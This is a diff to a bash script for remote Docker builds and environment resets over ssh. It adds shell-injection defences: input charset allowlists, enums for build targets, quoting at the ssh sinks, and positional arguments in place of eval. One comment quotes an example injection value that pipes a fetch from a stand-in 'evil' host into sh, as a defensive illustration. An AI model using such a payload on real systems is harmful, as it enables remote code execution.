@@ -119,8 +119,13 @@ REMOTE_BUILD_DIR="${ACX_REMOTE_BUILD_DIR:-/tmp/acx-build}"
 # Optional docker build --target. Empty means BuildKit's default (last stage = runtime).
 # This is the plumbing the script would pass as `docker build --target ...`; there was no
 # prior target notion in this file — introduce it only as the explicit opt-in for VLM/etc.
+# Case-normalised at ingestion (D8); Docker --target match is case-insensitive so we refuse
+# mixed-case evasion of the *vlm* remote-build guard.
 ACX_BUILD_TARGET="${ACX_BUILD_TARGET:-}"
 ACX_IMAGE_VARIANT="${ACX_IMAGE_VARIANT:-}"
+# Lower-case once at ingestion so enum + D8 + refuse_remote_vlm_build see a single form.
+ACX_BUILD_TARGET="$(printf '%s' "${ACX_BUILD_TARGET}" | tr '[:upper:]' '[:lower:]')"
+ACX_IMAGE_VARIANT="$(printf '%s' "${ACX_IMAGE_VARIANT}" | tr '[:upper:]' '[:lower:]')"
 
 # Pre-build free-space floor on the remote docker data root (GB).
 # Justification (not a round guess): torch-free recognition image is ~1.1GB today; a single
@@ -153,14 +158,15 @@ fail() { printf '%sxx%s %s\n'  "${RED}"    "${RESET}" "$*" >&2; exit 1; }
 
 # D1: refuse shell/ssh metacharacters before any remote interpolation. Quoting is not enough —
 # a value like x';curl evil|sh;' closes a single-quoted ssh fragment and runs as ubuntu on the VM.
-# Allowlist: empty OR ^[A-Za-z0-9_.-]+$ (docker target / tag / short name safe set).
+# Allowlist: empty OR ^[A-Za-z0-9_./-]+$ (docker target / tag / short name / remote path safe set).
+# `/` is path-safe (not a shell metacharacter) so ACX_REMOTE_BUILD_DIR can share this gate.
 assert_safe_shell_token() {
   local name="$1" value="$2"
   if [[ -z "${value}" ]]; then
     return 0
   fi
-  if [[ ! "${value}" =~ ^[A-Za-z0-9_.-]+$ ]]; then
-    fail "${name} failed charset validation (allowed: empty or [A-Za-z0-9_.-]+); refusing value that could reach a remote shell: ${value}"
+  if [[ ! "${value}" =~ ^[A-Za-z0-9_./-]+$ ]]; then
+    fail "${name} failed charset validation (allowed: empty or [A-Za-z0-9_./-]+); refusing value that could reach a remote shell: ${value}"
   fi
 }
 
@@ -175,17 +181,56 @@ assert_safe_image_repo() {
   fi
 }
 
+# Reset-path site URL: allow typical URL charset; refuse shell metacharacters (;`$| etc.).
+# Regex must live in a variable: `#` would start a comment if written inline in [[ ]].
+assert_safe_reset_site_url() {
+  local value="$1"
+  local re='^[A-Za-z0-9_.:/@%?=&#+-]+$'
+  if [[ -z "${value}" ]]; then
+    fail "ACX_RESET_SITE_URL must not be empty"
+  fi
+  if [[ ! "${value}" =~ $re ]]; then
+    fail "ACX_RESET_SITE_URL failed charset validation (URL charset only); refusing value that could reach a remote shell: ${value}"
+  fi
+}
+
 # Validate operator-facing tokens at ingestion (before resolve / IMAGE_BASE / any ssh).
 assert_safe_shell_token "IMAGE_NAME" "${IMAGE_NAME}"
 assert_safe_shell_token "OCIR_NAMESPACE" "${OCIR_NAMESPACE}"
 assert_safe_shell_token "OCIR_REGISTRY" "${OCIR_REGISTRY}"
 assert_safe_shell_token "ACX_BUILD_TARGET" "${ACX_BUILD_TARGET}"
 assert_safe_shell_token "ACX_IMAGE_VARIANT" "${ACX_IMAGE_VARIANT}"
+# D1: REMOTE_BUILD_DIR is interpolated into ssh remote command strings — same sink class as
+# ACX_BUILD_TARGET. Empty is refused (operator override of "" would otherwise skip the default).
+if [[ -z "${REMOTE_BUILD_DIR}" ]]; then
+  fail "ACX_REMOTE_BUILD_DIR must not be empty"
+fi
+assert_safe_shell_token "ACX_REMOTE_BUILD_DIR" "${REMOTE_BUILD_DIR}"
+
+# D8: explicit allowed-value enums (case already folded lower above). Anything else fails closed —
+# including `vlm2`, `bogus`, and previously-accepted freeform targets that could overwrite tags.
+assert_allowed_build_target() {
+  case "${ACX_BUILD_TARGET}" in
+    ""|runtime|runtime-vlm|builder|builder-vlm|runtime-base|uv) ;;
+    *)
+      fail "ACX_BUILD_TARGET must be one of: empty, runtime, runtime-vlm, builder, builder-vlm, runtime-base, uv (got: ${ACX_BUILD_TARGET})"
+      ;;
+  esac
+}
+assert_allowed_image_variant() {
+  case "${ACX_IMAGE_VARIANT}" in
+    ""|recognition|vlm) ;;
+    *)
+      fail "ACX_IMAGE_VARIANT must be one of: empty, recognition, vlm (got: ${ACX_IMAGE_VARIANT})"
+      ;;
+  esac
+}
+assert_allowed_build_target
+assert_allowed_image_variant
 
 # RA-07: derive repository name from ACX_BUILD_TARGET (+ ACX_IMAGE_VARIANT) so VLM and
 # recognition never share tags. Empty target keeps the historical IMAGE_NAME (default
-# acx-backend). runtime-vlm appends -vlm. Unknown non-empty targets also get a greppable
-# suffix so they cannot overwrite recognition.
+# acx-backend). runtime-vlm appends -vlm.
 # D8 (build half): ACX_IMAGE_VARIANT=vlm is FAIL-CLOSED unless ACX_BUILD_TARGET matches *vlm*.
 resolve_image_repo_name() {
   local target="${ACX_BUILD_TARGET:-}"
@@ -194,9 +239,12 @@ resolve_image_repo_name() {
     fail "ACX_IMAGE_VARIANT=vlm requires ACX_BUILD_TARGET matching *vlm* (got: ${target:-empty}); refusing fail-open variant/repo split"
   fi
   case "${target}" in
-    ""|runtime) printf '%s\n' "${IMAGE_NAME}" ;;
-    runtime-vlm) printf '%s-vlm\n' "${IMAGE_NAME}" ;;
-    *) printf '%s-%s\n' "${IMAGE_NAME}" "${target}" ;;
+    ""|runtime|runtime-base|builder|uv) printf '%s\n' "${IMAGE_NAME}" ;;
+    runtime-vlm|builder-vlm) printf '%s-vlm\n' "${IMAGE_NAME}" ;;
+    *)
+      # Enum above should make this unreachable; fail closed rather than invent a repo suffix.
+      fail "ACX_BUILD_TARGET=${target} is not mapped to an image repository (internal enum drift)"
+      ;;
   esac
 }
 IMAGE_BASE="${OCIR_REGISTRY}/${OCIR_NAMESPACE}/$(resolve_image_repo_name)"
@@ -417,7 +465,9 @@ do_build_remote() {
   assert_remote_build_free_space
 
   log "Syncing build context ${SERVICE_DIR}/ -> ${SSH_TARGET}:${REMOTE_BUILD_DIR}/"
-  ssh "${SSH_TARGET}" "mkdir -p ${REMOTE_BUILD_DIR}"
+  # D1: REMOTE_BUILD_DIR is charset-validated at ingestion; still single-quote at the sink so a
+  # future allowlist slip cannot unquote into remote argv (same blast radius as ACX_BUILD_TARGET).
+  ssh "${SSH_TARGET}" "mkdir -p -- '${REMOTE_BUILD_DIR}'"
   # Weight-artifact excludes must stay in lockstep with apps/prototype-description-service/.dockerignore
   # (see test_dockerignore_weight_exclusions.py). This list does NOT read .dockerignore.
   #
@@ -454,7 +504,8 @@ do_build_remote() {
   log "Building ${IMAGE_BASE}:${tag} + :${sha:0:8} on ${SSH_TARGET} (native arm64${ACX_BUILD_TARGET:+, target=${ACX_BUILD_TARGET}})"
   # No --platform: VM is already linux/arm64 (Ampere A1).
   # shellcheck disable=SC2086 # target_args is intentionally word-split (empty or "--target X")
-  ssh "${SSH_TARGET}" "cd ${REMOTE_BUILD_DIR} && docker build \
+  # D1: quote REMOTE_BUILD_DIR (validated at ingestion) so it cannot re-open the ssh injection sink.
+  ssh "${SSH_TARGET}" "cd -- '${REMOTE_BUILD_DIR}' && docker build \
       --build-arg GIT_COMMIT_SHA=${sha} \
       ${target_args} \
       -t ${IMAGE_BASE}:${tag} \
@@ -1127,38 +1178,42 @@ do_reset() {
     fail "ACX_RESET_SITE_URL must be set to the WordPress site URL the plugin will hit (e.g. http://localhost:10010 for LocalWP, or https://staging.altcontext.com). The bootstrap derives the per-site tenant UUID from this value to match the plugin's TenantIdentity::derive_from_site_url() (E15-12-BR-06). Set ACX_RESET_TENANT_ID as well only if you need to override derivation for a custom tenant."
   fi
   local site_url="${ACX_RESET_SITE_URL}"
+  # D1/S2-A-02: validate BEFORE any ssh/bootstrap interpolation — these reach remote root via sudo.
+  assert_safe_reset_site_url "${site_url}"
   local tenant_id
   if [[ -n "${ACX_RESET_TENANT_ID:-}" ]]; then
     tenant_id="${ACX_RESET_TENANT_ID}"
   else
     tenant_id="$(python3 "${SCRIPT_DIR}/_derive_tenant_id.py" "${site_url}")"
   fi
-  # E15-12-BR-05: each `docker compose exec -T` reads from this script's
-  # stdin (the `bash -s <<<"${bootstrap_cmd}"` heredoc on line 509). Without
-  # `< /dev/null` on each exec, the first call swallows the remaining lines
-  # of bootstrap_cmd and the second call silently never runs — the operator
-  # sees the tenant create succeed but no `api_key=` line is printed and the
-  # plugin has nothing to authenticate with.
-  local bootstrap_cmd
-  printf -v bootstrap_cmd '%s\n' \
-    "cd ${remote_dir}" \
-    "echo '==> Ensuring tenant row exists for service-mode key bootstrap'" \
-    "sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod tenant create --tenant ${tenant_id} --site-url ${site_url} < /dev/null" \
-    "echo '==> Creating post-reset service-mode API key (operator: copy api_key= line into the plugin)'" \
-    "sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod create --tenant ${tenant_id} < /dev/null"
+  assert_safe_shell_token "ACX_RESET_TENANT_ID" "${tenant_id}"
+
+  # E15-12-BR-05: each `docker compose exec -T` reads from the remote script's stdin.
+  # Without `< /dev/null` on each exec, the first call swallows remaining lines and the
+  # second call never runs. Tenant/site values are positional args to `bash -s` (quoted
+  # heredoc) — never interpolated into the remote command string (S2-A-02).
+  # Audit text for dry-run / operator review. The LIVE path never interpolates these into a
+  # remote shell string — it passes them as bash -s positional args (see ssh below).
+  local bootstrap_summary
+  printf -v bootstrap_summary '%s\n' \
+    "bash -s -- ${remote_dir} ${tenant_id} ${site_url}" \
+    "  # remote body (quoted heredoc): \$1=remote_dir \$2=tenant_id \$3=site_url" \
+    "  cd \"\$1\"" \
+    "  sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod tenant create --tenant ${tenant_id} --site-url ${site_url} < /dev/null" \
+    "  sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod create --tenant ${tenant_id} < /dev/null"
 
   # /ready verification: distinct from /health because reset specifically needs
   # dependency readiness (postgres up, schema migrated, models loaded) before
-  # we declare the env operable.
-  local verify_cmd="curl -fsS --max-time 30 ${ready_url}"
+  # we declare the env operable. Array form — no shell-eval of the verify command (S2-A-02).
+  local -a verify_cmd=(curl -fsS --max-time 30 "${ready_url}")
 
   if [[ "${ACX_RESET_DRY_RUN:-0}" == "1" ]]; then
     log "DRY-RUN: would invoke ssh ${SSH_TARGET} with the following remote command:"
     printf '%s\n' "${remote_cmd}"
     log "DRY-RUN: would then verify readiness:"
-    printf '%s\n' "${verify_cmd}"
+    printf '%s\n' "${verify_cmd[*]}"
     log "DRY-RUN: would then run post-reset bootstrap on ${SSH_TARGET}:"
-    printf '%s\n' "${bootstrap_cmd}"
+    printf '%s\n' "${bootstrap_summary}"
     log "DRY-RUN: no SSH session opened; no remote state mutated"
     return 0
   fi
@@ -1172,7 +1227,7 @@ do_reset() {
   # before postgres + the API report ready. The bootstrap must wait for /ready
   # because `docker compose exec api` requires the api container to be up.
   local attempts=0
-  until eval "${verify_cmd}"; do
+  until "${verify_cmd[@]}"; do
     attempts=$((attempts + 1))
     if (( attempts >= 6 )); then
       fail "Readiness check failed after ${attempts} attempts at ${ready_url}"
@@ -1182,7 +1237,21 @@ do_reset() {
   done
 
   log "Running post-reset bootstrap on ${SSH_TARGET} (tenant create + key create)"
-  ssh "${SSH_TARGET}" "bash -s" <<<"${bootstrap_cmd}"
+  # Positional args — quoted heredoc body never expands local shell values into the
+  # remote command string. tenant_id / site_url reach remote only as argv after --.
+  # Unquoted multi-word form: OpenSSH joins destination args into the remote command, so
+  # remote argv is: bash -s -- <remote_dir> <tenant_id> <site_url> (charset-validated above).
+  ssh "${SSH_TARGET}" bash -s -- "${remote_dir}" "${tenant_id}" "${site_url}" <<'BOOTSTRAP'
+set -euo pipefail
+remote_dir="$1"
+tenant_id="$2"
+site_url="$3"
+cd "${remote_dir}"
+echo "==> Ensuring tenant row exists for service-mode key bootstrap"
+sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod tenant create --tenant "${tenant_id}" --site-url "${site_url}" < /dev/null
+echo "==> Creating post-reset service-mode API key (operator: copy api_key= line into the plugin)"
+sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod create --tenant "${tenant_id}" < /dev/null
+BOOTSTRAP
 
   log "Reset complete. ${ready_url} returned ready and a fresh service-mode API key was printed above."
 }
